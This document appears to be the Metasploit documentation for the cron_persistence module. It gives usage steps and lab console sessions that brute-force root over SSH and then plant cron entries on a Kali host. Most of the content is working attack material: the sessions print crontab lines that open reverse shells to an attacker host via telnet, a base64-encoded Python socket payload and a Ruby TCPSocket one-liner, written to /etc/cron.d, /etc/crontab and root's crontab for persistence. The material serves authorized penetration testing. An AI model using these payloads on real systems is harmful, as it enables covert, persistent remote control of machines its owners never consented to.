### Creating A Testing Environment

This module has been tested against:

1. Kali Rolling

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  4. Do: `use exploit/linux/local/cron_persistence`
  5. Do: `set session #`
  6. Do: `set target #`
  7. Do: `set verbose true`
  8. Optional Do: `set username` (depends on target selection)
  9. Optional Do: `set cleanup false`
  10. Do: `exploit`

## Options

  **username**

  Set a specific user's crontab if target 'User Crontab' is selected

  **timing**

  Set cron's timing.  Default is to run within a minute.  If this is changed, WfsDelay should be adjusted to compensate

  **cleanup**

  After the delayed period, use either perl (User/System Crontab) or standard MSF functionality to remove the cron entry.  **THIS WILL STOP THE PERSISTENCE!!!**

## Scenarios

### Kali Rolling (root)

Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username root
    username => root
    msf auxiliary(ssh_login) > set password password
    password => password
    msf auxiliary(ssh_login) > set rhosts 10.10.60.168
    rhosts => 10.10.60.168
    msf auxiliary(ssh_login) > exploit
    
    [*] 10.10.60.168:22 SSH - Starting bruteforce
    [+] 10.10.60.168:22 SSH - Success: 'root:password' 'uid=0(root) gid=0(root) groups=0(root) Linux kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) i686 GNU/Linux '
    [*] Command shell session 1 opened (10.10.60.168:50618 -> 10.10.60.168:22) at 2016-06-20 09:48:14 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Run our module (Cron)

    msf auxiliary(ssh_login) > use exploit/linux/local/cron_persistence
    msf exploit(cron_persistence) > set session 1
    session => 1
    msf exploit(cron_persistence) > set verbose true
    verbose => true
    msf exploit(cron_persistence) > set target 0
    target => 0
    msf exploit(cron_persistence) > exploit
    
    [*] Started reverse double handler
    [*] Max line length is 65537
    [*] Writing 152 bytes in 1 chunks of 518 bytes (octal-encoded), using printf
    [+] Writing * * * * * root sh -c '(sleep 3867|telnet 10.10.60.168 4444|while : ; do sh && break; done 2>&1|telnet 10.10.60.168 4444 >/dev/null 2>&1 &)' #bAeBQqUYeb to /etc/cron.d/FiThkldAZR
    [*] Waiting 90sec for callback
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo xPBXQvodQdzgByKR;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket A
    [*] A: "xPBXQvodQdzgByKR\r\n"
    [*] Matching...
    [*] B is input...
    [*] Command shell session 2 opened (10.10.60.168:4444 -> 10.10.60.168:45087) at 2016-06-20 13:04:02 -0400
    [+] Deleted /etc/cron.d/FiThkldAZR

Run our module (System Crontab)

    msf auxiliary(ssh_login) > use exploit/linux/local/cron_persistence
    msf exploit(cron_persistence) > set payload cmd/unix/reverse_python
    payload => cmd/unix/reverse_python
    msf exploit(cron_persistence) > set lhost 192.168.199.128
    lhost => 192.168.199.128
    msf exploit(cron_persistence) > set session 1
    session => 1
    msf exploit(cron_persistence) > set verbose true
    verbose => true
    msf exploit(cron_persistence) > set target 2
    target => 2
    msf exploit(cron_persistence) > set cleanup false
    cleanup => false
    msf exploit(cron_persistence) > exploit
    
    [*] Started reverse handler on 192.168.199.128:4444 
    [*] Max line length is 65537
    [*] Writing 1326 bytes in 1 chunks of 4969 bytes (octal-encoded), using printf
    [+] Writing * * * * * root python -c "exec('aW1wb3J0IHNvY2tldCAgICwgICAgICAgc3VicHJvY2VzcyAgICwgICAgICAgb3MgICAgICAgOyAgICAgaG9zdD0iMTkyLjE2OC4xOTkuMTI4IiAgICAgICA7ICAgICBwb3J0PTQ0NDQgICAgICAgOyAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgIHMuY29ubmVjdCgoaG9zdCAgICwgICAgICAgcG9ydCkpICAgICAgIDsgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgICAgICAgMCkgICAgICAgOyAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgICAgICAxKSAgICAgICA7ICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAgICAgIDIpICAgICAgIDsgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))" #SnwfsUhNys to /etc/crontab
    [*] Waiting 90sec for callback
    [*] Command shell session 2 opened (192.168.199.128:4444 -> 192.168.199.128:54837) at 2016-06-20 13:24:01 -0400

And since we didn't clean up, if our session dies...

    ^C
    Abort session 2? [y/N]  y
    
    [*] 10.10.60.168 - Command shell session 2 closed.  Reason: User exit
    msf exploit(cron_persistence) > use exploit/multi/handler 
    msf exploit(handler) > set payload cmd/unix/reverse_python
    payload => cmd/unix/reverse_python
    msf exploit(handler) > set lhost 192.168.199.128
    lhost => 192.168.199.128
    msf exploit(handler) > exploit
    
    [*] Started reverse handler on 192.168.199.128:4444 
    [*] Starting the payload handler...
    [*] Command shell session 3 opened (192.168.199.128:4444 -> 192.168.199.128:54842) at 2016-06-20 13:27:01 -0400

Run our module (User Crontab)

    msf exploit(cron_persistence) > set payload cmd/unix/reverse_ruby
    payload => cmd/unix/reverse_ruby
    msf exploit(cron_persistence) > set lhost 192.168.199.128
    lhost => 192.168.199.128
    msf exploit(cron_persistence) > set session 1
    session => 1
    msf exploit(cron_persistence) > set verbose true
    verbose => true
    msf exploit(cron_persistence) > set target 1
    target => 1
    msf exploit(cron_persistence) > exploit
    
    [*] Started reverse handler on 192.168.199.128:4444 
    [*] Max line length is 65537
    [*] Writing 1247 bytes in 1 chunks of 4566 bytes (octal-encoded), using printf
    [+] Writing * * * * * ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.199.128","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' #IiWAtaIrHs to /var/spool/cron/crontabs/root
    [*] Reloading cron to pickup new entry
    [*] Waiting 90sec for callback
    [*] Command shell session 2 opened (192.168.199.128:4444 -> 192.168.199.128:55031) at 2016-06-20 14:22:01 -0400
